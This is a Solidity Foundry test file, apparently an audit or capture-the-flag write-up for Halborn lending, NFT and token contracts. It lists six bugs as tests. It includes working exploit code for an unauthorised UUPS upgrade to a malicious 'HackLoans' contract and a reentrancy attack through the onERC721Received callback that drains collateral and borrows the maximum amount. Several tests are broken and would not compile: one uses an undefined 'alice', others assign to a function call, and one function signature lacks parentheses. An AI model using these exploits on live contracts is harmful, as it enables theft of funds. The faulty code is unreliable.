// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Utils.sol";
import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";

import {HalbornNFT} from "../src/HalbornNFT.sol";
import {HalbornLoans} from "../src/HalbornLoans.sol";
import {HalbornToken} from "../src/HalbornToken.sol";
import {HackLoans} from "../src/HackLoans.sol";

contract HalbornLoans_Test is Test {
    HalbornToken public token;
    ERC1967Proxy public tokenProxy;
    HalbornToken public tokenImpl;

    HalbornNFT public nft;
    ERC1967Proxy public nftProxy;
    HalbornNFT public nftImpl;

    HalbornLoans public loans;
    ERC1967Proxy public loanProxy;
    HalbornLoans public loanImpl;

    function setUp() public {
        tokenImpl = new HalbornToken();
        tokenProxy = new ERC1967Proxy(address(tokenImpl), "");
        token = HalbornToken(address(tokenProxy));
        token.initialize();

        nftImpl = new HalbornNFT();
        nftProxy = new ERC1967Proxy(address(nftImpl), "");
        nft = HalbornNFT(address(nftProxy));
        nft.initialize(keccak256(abi.encodePacked("root")), 5 ether);

        loanImpl = new HalbornLoans(0);
        bytes memory initData = abi.encodeWithSelector(
            HalbornLoans.initialize.selector,
            address(token),
            address(nft)
        );
        loanProxy = new ERC1967Proxy(address(loanImpl), initData);
        loans = HalbornLoans(address(loanProxy));

        token.setLoans(address(loans));
    }

    /*
    BUG 1: Anyone can upgrade the contract to a malicious contract. NO ACCESS CONTROL
     After upgrading to the malicious contract, 
     1. Loans address can be set to any address
     2. Unlimited minting of tokens
     3. Unlimited burning of tokens
     4. ETH can be stolen from the contract
     5. Price can be set to any value
    */
    function test_vulnerableUUPSupgrade() public {
        address unauthorizedUser = address(0x6969);
        vm.startPrank(unauthorizedUser);

        HackLoans attack = new HackLoans(0);
        loans.upgradeTo(address(attack));
        loans.initialize(address(1), address(1));

        HackLoans hackedLoans = HackLoans(address(loanProxy));
        hackedLoans.initialize(address(token), address(nft));
        hackedLoans.mint();

        assertEq(token.balanceOf(address(this)), type(uint256).max);

        hackedLoans.burn(alice);
        assertEq(token.balanceOf(alice), 0);
    }

    // BUG 2: Reentrancy in withdrawCollateral function
    function test_Reentrancy() public {
        // get two NFTs as intended by design
        nft.mintBuyWithETH{value: 1 ether}();
        nft.mintBuyWithETH{value: 1 ether}();

        assertEq(nft.balanceOf(address(this)), 2);

        nft.approve(address(loans), 1);
        nft.approve(address(loans), 2);
        loans.depositNFTCollateral(1);
        loans.depositNFTCollateral(2);

        // reentrancy attack
        startHack = true;
        loans.withdrawCollateral(1);

        assertEq(nft.ownerOf(1), address(this));
        assertEq(nft.ownerOf(2), address(this));

        assertEq(token.balanceOf(address(this)), type(uint256).max);
    }

    bool public startHack = false;

    // BUG 3: Incorrect usedCollateral calculation in returnLoan function
    function test_ReturnLoan() public {
        nft.mintBuyWithETH{value: 1 ether}();
        nft.mintBuyWithETH{value: 1 ether}();

        assertEq(nft.balanceOf(address(this)), 2);

        nft.approve(address(loans), 1);
        nft.approve(address(loans), 2);
        loans.depositNFTCollateral(1);
        loans.depositNFTCollateral(2);

        loans.usedCollateral(address(this)) = 0;

        loans.getLoan(1 ether);
        // usedCollateral is incremented by 1 ether
        assertEq(loans.usedCollateral(address(this)), 1 ether);

        loans.returnLoan(1 ether);
        // usedCollateral is again incremented by 1 ether
        assertEq(loans.usedCollateral(address(this)), 2 ether);
    }

    // BUG 4: Incorrect check for collateral availability in getLoan function
    function test_GetLoan() public {
        nft.mintBuyWithETH{value: 1 ether}();
        nft.mintBuyWithETH{value: 1 ether}();

        assertEq(nft.balanceOf(address(this)), 2);

        nft.approve(address(loans), 1);
        nft.approve(address(loans), 2);
        loans.depositNFTCollateral(1);
        loans.depositNFTCollateral(2);

        loans.usedCollateral(address(this)) = 0;

        // get loan of 10 ether which is way more than the collateral
        loans.getLoan(10 ether);

        assertEq(loans.usedCollateral(address(this)), 10 ether);

    }

    // BUG 5: usedCollateral is not decremented after withdrawing collateral
    function test_WithdrawCollateral public {
        nft.mintBuyWithETH{value: 1 ether}();
        nft.mintBuyWithETH{value: 1 ether}();

        assertEq(nft.balanceOf(address(this)), 2);

        nft.approve(address(loans), 1);
        nft.approve(address(loans), 2);
        loans.depositNFTCollateral(1);
        loans.depositNFTCollateral(2);
        assertEq(loans.usedCollateral(address(this)), 0);

        loans.getLoan(1 ether);
        assertEq(loans.usedCollateral(address(this)), 1 ether);

        loans.withdrawCollateral(1);

        // usedCollateral is still 1 ether
        assertEq(loans.usedCollateral(address(this)), 1 ether);
    }

    // BUG 6: Constructor for a UUPS Upgradeable Contract without Disable Initializer Check with immutable Variable
    function test_Constructor() public {
        HalbornLoans loans = new HalbornLoans(0);

        // constructor should not be called
        assertEq(loans.collateralPrice(), 0);
    }

    function onERC721Received(
        address,
        /* operator */ address,
        /* from */ uint256 tokenId,
        bytes calldata /* data */
    ) external returns (bytes4) {
        if (startHack) {
            startHack = false;
            loans.withdrawCollateral(tokenId == 1 ? 2 : 1);
            if (tokenId == 1) {
                loans.getLoan(type(uint256).max);
            }
        }
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
